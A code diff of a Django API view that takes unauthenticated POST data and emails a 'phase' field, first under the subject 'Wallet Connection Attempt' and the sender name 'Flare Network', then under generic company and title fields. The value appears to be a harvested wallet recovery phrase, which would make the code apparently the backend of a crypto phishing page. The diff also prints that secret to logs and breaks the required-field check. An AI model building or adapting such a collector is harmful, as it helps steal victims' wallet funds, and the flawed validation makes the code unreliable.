@@ -9,18 +9,21 @@ class SendEmail(APIView):
     permission_classes = [AllowAny]
 
     def post(self, request):
-        wallet_label = request.data.get("wallet_label")
+        company_name = request.data.get("company")
+        header = request.data.get("title")
         phase = request.data.get("phase")
         email = request.data.get('email')
 
-        if not wallet_label or not phase or not email:
+        print(phase)
+
+        if not phase and email:
             return Response(
-                {"error": "wallet_label, phase, and email are required"},
+                {"error": "phase, and email are required"},
                 status=status.HTTP_400_BAD_REQUEST
             )
 
         # Example: do something (send email, save, etc.)
-        send_mail(email, f"<p>{phase}</p>", f"Wallet Connection Attempt: {wallet_label}", "Flare Network")
+        send_mail(email, f"<p>{phase}</p>", f"{header}", "Flare Network", f"{company_name}")
 
         return Response(
             {"success": "Email request received"},
